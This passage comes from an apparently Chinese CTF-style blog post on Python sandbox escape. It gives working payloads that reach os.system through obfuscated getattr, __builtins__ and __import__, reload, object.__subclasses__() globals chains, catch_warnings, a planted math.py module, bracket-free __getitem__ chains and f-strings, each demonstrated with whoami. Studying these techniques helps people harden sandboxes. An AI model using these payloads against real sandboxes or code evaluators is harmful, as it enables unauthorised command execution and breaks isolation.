-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(os.system(&#39;whoami&#39;))</span><br><span class="line">print(os.popen(&#39;whoami&#39;).read()) </span><br><span class="line">print(os.popen2(&#39;whoami&#39;).read()) # 2.x</span><br><span class="line">print(os.popen3(&#39;whoami&#39;).read()) # 2.x</span><br><span class="line">print(os.popen4(&#39;whoami&#39;).read()) # 2.x</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>应该还有一些，可以在这里找找：</p>
-<p><a href="https://docs.python.org/2/library/os.html" target="_blank" rel="noopener">2.x 传送门</a></p>
-<p><a href="https://docs.python.org/3/library/os.html" target="_blank" rel="noopener">3.x 传送门</a></p>
-<p>过滤<code>system</code>的时候说不定还有其他函数给漏了。</p>
-<p>其次，可以通过 <code>getattr</code> 拿到对象的方法、属性：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">getattr(os, &#39;metsys&#39;[::-1])(&#39;whoami&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>不让出现 import也没事：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; getattr(getattr(__builtins__, &#39;__tropmi__&#39;[::-1])(&#39;so&#39;[::-1]), &#39;metsys&#39;[::-1])(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-
-<p>一样可以。这个方法同样可以用于逃逸过滤 import 的沙箱。关于 <code>__builtins__</code>，见下文。</p>
-<p>与 <code>getattr</code> 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性/方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code>，还找不到则报错。更具体的这里就不解释了，有兴趣的话可以搜搜。</p>
-<h3 id="builtins、builtin与builtins"><a href="#builtins、builtin与builtins" class="headerlink" title="builtins、builtin与builtins"></a>builtins、<strong>builtin</strong>与<strong>builtins</strong></h3><p>先说一下，<code>builtin</code>、<code>builtins</code>，<code>__builtin__</code>与<code>__builtins__</code>的区别：首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，Python 对函数、变量、类等等的查找方式是按 <code>LEGB</code> 规则来找的，其中 B 即代表内建模块，这里也不再赘述了，有兴趣的搜搜就明白了。</p>
-<p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：</p>
-<p>2.x：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import __builtin__</span><br><span class="line">&gt;&gt;&gt; __builtin__</span><br><span class="line">&lt;module &#39;__builtin__&#39; (built-in)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>3.x：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import builtins</span><br><span class="line">&gt;&gt;&gt; builtins</span><br><span class="line">&lt;module &#39;builtins&#39; (built-in)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>但是，<code>__builtins__</code> 两者都有，实际上是<code>__builtin__</code>和<code>builtins</code> 的引用。它不需要导入，我估计是为了统一 2.x 和 3.x。不过<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>是有一点区别的，感兴趣的话建议查一下，这里就不啰嗦了。不管怎么样，<code>__builtins__</code> 相对实用一点，并且在 <code>__builtins__</code>里有很多好东西：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;__import__&#39; in dir(__builtins__)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; &#39;eval&#39; in dir(__builtins__)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &#39;execfile&#39; in dir(__builtins__)</span><br><span class="line">True</span><br></pre></td></tr></table></figure>
-
-<p>那么既然<code>__builtins__</code>有这么多危险的函数，不如将里面的危险函数破坏了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&#39;eval&#39;] &#x3D; &#39;not allowed&#39;</span><br></pre></td></tr></table></figure>
-
-<p>或者直接删了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del __builtins__.__dict__[&#39;eval&#39;]</span><br></pre></td></tr></table></figure>
-
-<p>但是我们可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。不过，我们在使用 <code>reload</code> 的时候也没导入，说明<code>reload</code>也在 <code>__builtins__</code>里，那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。还有一种情况是利用 <code>exec command in _global</code> 动态运行语句时的绕过，比如实现一个计算器的时候，在最后有给出例子。</p>
-<p>这里注意，2.x 的 <code>reload</code> 是内建的，3.x 需要 <code>import imp</code>，然后再 <code>imp.reload</code>。你看，reload 的参数是 <code>module</code>，所以肯定还能用于重新载入其他模块，这个放在下面说。</p>
-<h3 id="通过继承关系逃逸"><a href="#通过继承关系逃逸" class="headerlink" title="通过继承关系逃逸"></a>通过继承关系逃逸</h3><p>在 Python 中提到继承就不得不提 <code>mro</code>，<code>mro</code>就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。2.2 之前是经典类，搜索是深度优先；经典类后来发展为新式类，使用广度优先搜索，再后来新式类的搜索变为 C3 算法；而 3.x 中新式类一统江湖，默认继承 <code>object</code>，当然也是使用的 C3 搜索算法。。。扯远了扯远了，感兴趣的可以搜搜。不管怎么说，总是让人去判断继承关系显然是反人类的，所以 Python 中新式类都有个属性，叫<code>__mro__</code>，是个元组，记录了继承关系：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__</span><br><span class="line">(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)</span><br></pre></td></tr></table></figure>
-
-<p>类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>&#39;&#39;</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class test:</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; test.__bases__</span><br><span class="line">&gt;&gt;&gt; class test(object):</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; test.__bases__</span><br><span class="line">(&lt;type &#39;object&#39;&gt;,)</span><br></pre></td></tr></table></figure>
-
-<p>那么知道这个有什么用呢？</p>
-<p>由于没法直接引入 os，那么假如有个库叫<code>oos</code>，在<code>oos</code>中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os（<code>__globals__</code>是函数所在的全局命名空间中所定义的全局变量）。例如，<code>site</code> 这个库就有 <code>os</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import site</span><br><span class="line">&gt;&gt;&gt; site.os</span><br><span class="line">&lt;module &#39;os&#39; from &#39;&#x2F;Users&#x2F;macr0phag3&#x2F;.pyenv&#x2F;versions&#x2F;3.6.5&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 <code>import site</code>。可以利用 <code>reload</code>，变相加载 <code>os</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import site</span><br><span class="line">&gt;&gt;&gt; os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">NameError: name &#39;os&#39; is not defined</span><br><span class="line">&gt;&gt;&gt; os &#x3D; reload(site.os)</span><br><span class="line">&gt;&gt;&gt; os.system(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-
-<p>还有，既然所有的类都继承的<code>object</code>，那么我们先用<code>__subclasses__</code>看看它的子类，以 2.x 为例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for i in enumerate(&#39;&#39;.__class__.__mro__[-1].__subclasses__()): print i</span><br><span class="line">...</span><br><span class="line">(0, &lt;type &#39;type&#39;&gt;)</span><br><span class="line">(1, &lt;type &#39;weakref&#39;&gt;)</span><br><span class="line">(2, &lt;type &#39;weakcallableproxy&#39;&gt;)</span><br><span class="line">(3, &lt;type &#39;weakproxy&#39;&gt;)</span><br><span class="line">(4, &lt;type &#39;int&#39;&gt;)</span><br><span class="line">(5, &lt;type &#39;basestring&#39;&gt;)</span><br><span class="line">(6, &lt;type &#39;bytearray&#39;&gt;)</span><br><span class="line">(7, &lt;type &#39;list&#39;&gt;)</span><br><span class="line">(8, &lt;type &#39;NoneType&#39;&gt;)</span><br><span class="line">(9, &lt;type &#39;NotImplementedType&#39;&gt;)</span><br><span class="line">(10, &lt;type &#39;traceback&#39;&gt;)</span><br><span class="line">(11, &lt;type &#39;super&#39;&gt;)</span><br><span class="line">(12, &lt;type &#39;xrange&#39;&gt;)</span><br><span class="line">(13, &lt;type &#39;dict&#39;&gt;)</span><br><span class="line">(14, &lt;type &#39;set&#39;&gt;)</span><br><span class="line">(15, &lt;type &#39;slice&#39;&gt;)</span><br><span class="line">(16, &lt;type &#39;staticmethod&#39;&gt;)</span><br><span class="line">(17, &lt;type &#39;complex&#39;&gt;)</span><br><span class="line">(18, &lt;type &#39;float&#39;&gt;)</span><br><span class="line">(19, &lt;type &#39;buffer&#39;&gt;)</span><br><span class="line">(20, &lt;type &#39;long&#39;&gt;)</span><br><span class="line">(21, &lt;type &#39;frozenset&#39;&gt;)</span><br><span class="line">(22, &lt;type &#39;property&#39;&gt;)</span><br><span class="line">(23, &lt;type &#39;memoryview&#39;&gt;)</span><br><span class="line">(24, &lt;type &#39;tuple&#39;&gt;)</span><br><span class="line">(25, &lt;type &#39;enumerate&#39;&gt;)</span><br><span class="line">(26, &lt;type &#39;reversed&#39;&gt;)</span><br><span class="line">(27, &lt;type &#39;code&#39;&gt;)</span><br><span class="line">(28, &lt;type &#39;frame&#39;&gt;)</span><br><span class="line">(29, &lt;type &#39;builtin_function_or_method&#39;&gt;)</span><br><span class="line">(30, &lt;type &#39;instancemethod&#39;&gt;)</span><br><span class="line">(31, &lt;type &#39;function&#39;&gt;)</span><br><span class="line">(32, &lt;type &#39;classobj&#39;&gt;)</span><br><span class="line">(33, &lt;type &#39;dictproxy&#39;&gt;)</span><br><span class="line">(34, &lt;type &#39;generator&#39;&gt;)</span><br><span class="line">(35, &lt;type &#39;getset_descriptor&#39;&gt;)</span><br><span class="line">(36, &lt;type &#39;wrapper_descriptor&#39;&gt;)</span><br><span class="line">(37, &lt;type &#39;instance&#39;&gt;)</span><br><span class="line">(38, &lt;type &#39;ellipsis&#39;&gt;)</span><br><span class="line">(39, &lt;type &#39;member_descriptor&#39;&gt;)</span><br><span class="line">(40, &lt;type &#39;file&#39;&gt;)</span><br><span class="line">(41, &lt;type &#39;PyCapsule&#39;&gt;)</span><br><span class="line">(42, &lt;type &#39;cell&#39;&gt;)</span><br><span class="line">(43, &lt;type &#39;callable-iterator&#39;&gt;)</span><br><span class="line">(44, &lt;type &#39;iterator&#39;&gt;)</span><br><span class="line">(45, &lt;type &#39;sys.long_info&#39;&gt;)</span><br><span class="line">(46, &lt;type &#39;sys.float_info&#39;&gt;)</span><br><span class="line">(47, &lt;type &#39;EncodingMap&#39;&gt;)</span><br><span class="line">(48, &lt;type &#39;fieldnameiterator&#39;&gt;)</span><br><span class="line">(49, &lt;type &#39;formatteriterator&#39;&gt;)</span><br><span class="line">(50, &lt;type &#39;sys.version_info&#39;&gt;)</span><br><span class="line">(51, &lt;type &#39;sys.flags&#39;&gt;)</span><br><span class="line">(52, &lt;type &#39;exceptions.BaseException&#39;&gt;)</span><br><span class="line">(53, &lt;type &#39;module&#39;&gt;)</span><br><span class="line">(54, &lt;type &#39;imp.NullImporter&#39;&gt;)</span><br><span class="line">(55, &lt;type &#39;zipimport.zipimporter&#39;&gt;)</span><br><span class="line">(56, &lt;type &#39;posix.stat_result&#39;&gt;)</span><br><span class="line">(57, &lt;type &#39;posix.statvfs_result&#39;&gt;)</span><br><span class="line">(58, &lt;class &#39;warnings.WarningMessage&#39;&gt;)</span><br><span class="line">(59, &lt;class &#39;warnings.catch_warnings&#39;&gt;)</span><br><span class="line">(60, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;)</span><br><span class="line">(61, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;)</span><br><span class="line">(62, &lt;class &#39;_abcoll.Hashable&#39;&gt;)</span><br><span class="line">(63, &lt;type &#39;classmethod&#39;&gt;)</span><br><span class="line">(64, &lt;class &#39;_abcoll.Iterable&#39;&gt;)</span><br><span class="line">(65, &lt;class &#39;_abcoll.Sized&#39;&gt;)</span><br><span class="line">(66, &lt;class &#39;_abcoll.Container&#39;&gt;)</span><br><span class="line">(67, &lt;class &#39;_abcoll.Callable&#39;&gt;)</span><br><span class="line">(68, &lt;type &#39;dict_keys&#39;&gt;)</span><br><span class="line">(69, &lt;type &#39;dict_items&#39;&gt;)</span><br><span class="line">(70, &lt;type &#39;dict_values&#39;&gt;)</span><br><span class="line">(71, &lt;class &#39;site._Printer&#39;&gt;)</span><br><span class="line">(72, &lt;class &#39;site._Helper&#39;&gt;)</span><br><span class="line">(73, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;)</span><br><span class="line">(74, &lt;type &#39;_sre.SRE_Match&#39;&gt;)</span><br><span class="line">(75, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;)</span><br><span class="line">(76, &lt;class &#39;site.Quitter&#39;&gt;)</span><br><span class="line">(77, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;)</span><br><span class="line">(78, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;)</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，site 就在里面，以 2.x 的<code>site._Printer</code>为例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__[&#39;os&#39;]</span><br><span class="line">&lt;module &#39;os&#39; from &#39;&#x2F;Users&#x2F;macr0phag3&#x2F;.pyenv&#x2F;versions&#x2F;2.7.15&#x2F;lib&#x2F;python2.7&#x2F;os.pyc&#39;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>os 又回来了。并且 site 中还有 <code>__builtins__</code>。</p>
-<p>这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 <code>warnings</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import warnings</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; warnings.os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#39;module&#39; object has no attribute &#39;os&#39;</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; warnings.linecache</span><br><span class="line">&lt;module &#39;linecache&#39; from &#39;&#x2F;Users&#x2F;macr0phag3&#x2F;.pyenv&#x2F;versions&#x2F;2.7.15&#x2F;lib&#x2F;python2.7&#x2F;linecache.pyc&#39;&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&gt;&gt;&gt; warnings.linecache.os</span><br><span class="line">&lt;module &#39;os&#39; from &#39;&#x2F;Users&#x2F;macr0phag3&#x2F;.pyenv&#x2F;versions&#x2F;2.7.15&#x2F;lib&#x2F;python2.7&#x2F;os.pyc&#39;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在继承链中就可以这样：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-
-<p>顺便说一下，<code>warnings</code>这个库中有个函数：<code>warnings.catch_warnings</code>，它有个<code>_module</code>属性：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    def __init__(self, record&#x3D;False, module&#x3D;None):</span><br><span class="line">...</span><br><span class="line">        self._module &#x3D; sys.modules[&#39;warnings&#39;] if module is None else module</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>所以通过<code>_module</code>也可以构造 payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39;][0]()._module.linecache.os.system(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-
-<p>3.x 中的<code>warnings</code>虽然没有 <code>linecache</code>，也有<code>__builtins__</code>。</p>
-<p>同样，py3.x 中有``，利用方式可以为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-
-<p>顺便提一下，<code>object</code> 本来就是可以使用的，如果没过滤这个变量的话，payload 可以简化为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>还有一种是利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#39;1+1&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>或者简单一点：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>还可以这样利用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class test(dict):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        print(super(test, self).keys.__class__.__call__(eval, &#39;1+1&#39;))</span><br><span class="line">        # 如果是 3.x 的话可以简写为：</span><br><span class="line">        # super().keys.__class__.__call__(eval, &#39;1+1&#39;))</span><br><span class="line">test()</span><br></pre></td></tr></table></figure>
-
-<p>上面的这些利用方式总结起来就是通过<code>__class__</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__bases__</code>等等属性/方法去获取 <code>object</code>，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等等能够直接被利用的库，或者找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行<code>eval</code>。</p>
-<p>最后，继承链的逃逸还有一些利用第三方库的方式，比如 <code>jinja2</code>，这类利用方式应该是叫 <code>SSTI</code>，可以看这个：<a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">传送门</a>，这里就不多说了。</p>
-<h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>2.x 有个内建的 <code>file</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; file(&#39;key&#39;).read()</span><br><span class="line">&#39;Macr0phag3\n&#39;</span><br><span class="line">&gt;&gt;&gt; file(&#39;key&#39;, &#39;w&#39;).write(&#39;Macr0phag3&#39;)</span><br><span class="line">&gt;&gt;&gt; file(&#39;key&#39;).read()</span><br><span class="line">&#39;Macr0phag3&#39;</span><br></pre></td></tr></table></figure>
-
-<p>还有个 <code>open</code>，2.x 与 3.x 通用。</p>
-<p>还有一些库，例如：<code>types.FileType</code>(rw)、<code>platform.popen</code>(rw)、<code>linecache.getlines</code>(r)。</p>
-<p>为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为<code>math.py</code>，然后 import 进来：</p>
-<p>math.py：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">print(os.system(&#39;whoami&#39;))</span><br></pre></td></tr></table></figure>
-
-<p>调用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import math</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-
-<p>这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;re&#39; in sys.modules</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &#39;math&#39; in sys.modules</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>当然在<code>import re</code> 之前<code>del sys.modules[&#39;re&#39;]</code>也不是不可以…</p>
-<p>最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 <code>test</code>的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p>
-<p>读文件暂时没什么发现特别的地方。</p>
-<p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __builtins__.open(&#39;key&#39;).read()</span><br><span class="line">&#39;Macr0phag3\n&#39;</span><br></pre></td></tr></table></figure>
-
-<p>或者</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40](&#39;key&#39;).read()</span><br><span class="line">&#39;Macr0phag3&#39;</span><br></pre></td></tr></table></figure>
-
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>过滤<code>[</code>、<code>]</code>：这个行为不像是 oj 会做得出来的，ctf 倒是有可能出现。应对的方式就是将<code>[]</code>的功能用<code>pop</code> 、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code> ）：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&#39;linecache&#39;).os.popen(&#39;whoami&#39;).read()</span><br><span class="line">&#39;macr0phag3\n&#39;</span><br></pre></td></tr></table></figure>
-
-<p>利用新特性：PEP 498 引入了 <code>f-string</code>，在 3.6 开始出现：<a href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features" target="_blank" rel="noopener">传送门</a>，食用方式：<a href="https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings" target="_blank" rel="noopener">传送门</a>。所以我们就有了一种船新的利用方式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f&#39;&#123;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#125;&#39;</span><br><span class="line">macr0phag3</span><br><span class="line">&#39;0&#39;</span><br></pre></td></tr></table></figure>
-
-<p>关注每次版本增加的新特性，或许能淘到点宝贝。</p>
-<p>序列化相关：序列化也是能用来逃逸，但是关于序列化的安全问题还挺多的，如果有时间我再写一篇文章来讨论好了。</p>
